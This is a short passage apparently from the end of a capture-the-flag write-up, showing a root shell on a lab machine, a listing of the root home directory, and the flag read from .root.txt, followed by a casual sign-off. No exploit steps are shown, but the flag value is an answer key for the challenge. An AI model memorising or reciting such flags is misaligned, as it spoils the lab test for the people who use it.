-rw-------  1 root root    2 Jun  3 15:11 .bash_history
-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc
drwx------  2 root root 4096 Jun 13  2020 .cache
drwx------  3 root root 4096 Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4096 Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor
root@kral4-PC:~# cat ./.root.txt
flag{63a9f0ea7bb98050796b649e85481845}
```
- yippeee imma go sleep now lmao <br>
![[vorp2 1.png]]